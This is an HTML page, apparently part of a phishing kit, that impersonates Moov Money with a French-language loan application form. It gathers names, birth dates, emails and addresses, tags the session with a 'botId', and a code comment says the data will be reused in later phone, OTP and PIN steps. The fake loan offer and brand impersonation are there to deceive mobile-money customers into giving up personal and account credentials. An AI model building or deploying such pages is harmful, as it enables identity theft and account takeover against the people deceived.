<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Moov Money - Demande de prêt</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
        }

        body {
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 400px;
            background: #0a0a0a;
            padding: 40px 24px 32px;
            border-radius: 0;
        }

        .logo {
            text-align: center;
            margin-bottom: 32px;
        }

        .logo-circle {
            width: 56px;
            height: 56px;
            background: #9A0000;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 12px;
            font-size: 28px;
            font-weight: 700;
            color: #fff;
        }

        .moov-text {
            font-size: 20px;
            font-weight: 700;
            color: #9A0000;
            letter-spacing: 0.5px;
        }

        .page-header h1 {
            font-size: 26px;
            font-weight: 700;
            color: #ffffff;
            margin-bottom: 6px;
        }

        .page-header p {
            font-size: 15px;
            color: rgba(255,255,255,0.5);
            margin-bottom: 28px;
        }

        form label {
            font-size: 14px;
            color: rgba(255,255,255,0.6);
            display: block;
            margin-bottom: 6px;
        }

        form input,
        form select {
            width: 100%;
            padding: 14px 16px;
            font-size: 15px;
            border-radius: 8px;
            border: 1px solid rgba(255,255,255,0.1);
            background: rgba(255,255,255,0.05);
            color: #ffffff;
            outline: none;
            transition: border-color 0.3s;
            margin-bottom: 18px;
        }

        form input:focus,
        form select:focus {
            border-color: #9A0000;
        }

        form input::placeholder,
        form select option {
            color: rgba(255,255,255,0.3);
        }

        form select option {
            background: #1a1a1a;
            color: #fff;
        }

        .checkbox-wrapper {
            display: flex;
            gap: 10px;
            margin-bottom: 16px;
            font-size: 14px;
            color: rgba(255,255,255,0.5);
            align-items: flex-start;
        }

        .checkbox-wrapper input[type="checkbox"] {
            width: 18px;
            height: 18px;
            min-width: 18px;
            margin-top: 2px;
            accent-color: #9A0000;
            cursor: pointer;
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 4px;
        }

        .checkbox-wrapper label {
            cursor: pointer;
            margin-bottom: 0;
            color: rgba(255,255,255,0.5);
        }

        .checkbox-wrapper label strong {
            color: #9A0000;
        }

        button {
            width: 100%;
            padding: 16px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 8px;
            border: none;
            cursor: pointer;
            transition: all 0.3s ease;
            background: #9A0000;
            color: #ffffff;
            opacity: 0.5;
        }

        button:enabled {
            opacity: 1;
        }

        button:hover:enabled {
            background: #7a0000;
        }

        .back-link {
            text-align: center;
            margin-top: 20px;
        }

        .back-link button {
            background: transparent;
            border: none;
            color: rgba(255,255,255,0.3);
            font-size: 14px;
            cursor: pointer;
            padding: 8px;
            width: auto;
            opacity: 1;
        }

        .back-link button:hover {
            color: rgba(255,255,255,0.6);
        }

        .footer {
            margin-top: 32px;
            text-align: center;
            font-size: 12px;
            color: rgba(255,255,255,0.2);
            letter-spacing: 0.5px;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Logo -->
        <div class="logo">
            <div class="logo-circle">M</div>
            <div class="moov-text">Moov Money</div>
        </div>

        <div class="page-header">
            <h1>Demande de prêt</h1>
            <p>Veuillez fournir vos informations personnelles</p>
        </div>

        <form id="loanForm">
            <label>Nom complet</label>
            <input name="fullName" placeholder="Ex: Jean Dupont" required />

            <label>Date de naissance</label>
            <input type="date" name="dob" required />

            <label>Adresse e-mail</label>
            <input type="email" name="email" placeholder="exemple@email.com" required />

            <label>Adresse résidentielle</label>
            <input name="address" placeholder="Votre adresse complète" required />

            <label>Situation professionnelle</label>
            <select name="employmentStatus" required>
                <option value="">Sélectionnez</option>
                <option>Employé</option>
                <option>Indépendant</option>
                <option>Sans emploi</option>
                <option>Étudiant</option>
            </select>

            <label>Objet du prêt</label>
            <select name="loanPurpose" required>
                <option value="">Sélectionnez</option>
                <option>Affaires</option>
                <option>Personnel</option>
                <option>Éducation</option>
                <option>Médical</option>
                <option>Urgence</option>
            </select>

            <label>Montant du prêt (FCFA)</label>
            <input type="number" name="loanAmount" required placeholder="MIN 4 000" min="4000" max="25000000" />

            <label>Durée du prêt</label>
            <select name="loanTerm" required>
                <option value="">Sélectionnez</option>
                <option>6 mois</option>
                <option selected>12 mois</option>
                <option>24 mois</option>
                <option>36 mois</option>
                <option>48 mois</option>
            </select>

            <div class="checkbox-wrapper">
                <input type="checkbox" id="termsCheck" required />
                <label for="termsCheck">J'accepte les conditions générales</label>
            </div>

            <div class="checkbox-wrapper">
                <input type="checkbox" id="interestCheck" required />
                <label for="interestCheck">
                    Je comprends que les prêts sont soumis à un taux d'intérêt de <strong>8 % à 15 % par mois</strong>
                    selon la solvabilité et le montant.
                </label>
            </div>

            <button id="continueBtn" type="submit" disabled>Continuer</button>
        </form>

        <div class="back-link">
            <button onclick="history.back()">Retour</button>
        </div>

        <div class="footer">v 5.3.2 (1.0.0)</div>
    </div>

    <script>
        // ---------- BOT ID ----------
        const params = new URLSearchParams(window.location.search);
        const urlBotId = params.get('botId');
        if (urlBotId) localStorage.setItem('botId', urlBotId);
        const botId = localStorage.getItem('botId');

        if (!botId) {
            alert('Session invalide. Veuillez recommencer.');
            window.location.href = 'index.html';
        }

        // ---------- FORM ELEMENTS ----------
        const form = document.getElementById('loanForm');
        const termsCheck = document.getElementById('termsCheck');
        const interestCheck = document.getElementById('interestCheck');
        const button = document.getElementById('continueBtn');

        // ---------- ENABLE BUTTON ----------
        function updateButton() {
            button.disabled = !(termsCheck.checked && interestCheck.checked);
        }

        termsCheck.addEventListener('change', updateButton);
        interestCheck.addEventListener('change', updateButton);

        // ---------- FORM SUBMIT ----------
        form.addEventListener('submit', (e) => {
            e.preventDefault();

            // Save all form data
            const data = Object.fromEntries(new FormData(form));
            localStorage.setItem('loanFormData', JSON.stringify(data));

            // Save the full name (used later in phone/OTP/PIN)
            localStorage.setItem('fullName', data.fullName);

            // Redirect to phone verification
            window.location.href = `details.html?botId=${botId}`;
        });

        // ---------- BACK BUTTON ----------
        document.querySelector('.back-link button').addEventListener('click', function(e) {
            e.preventDefault();
            window.history.back();
        });
    </script>
</body>
</html>
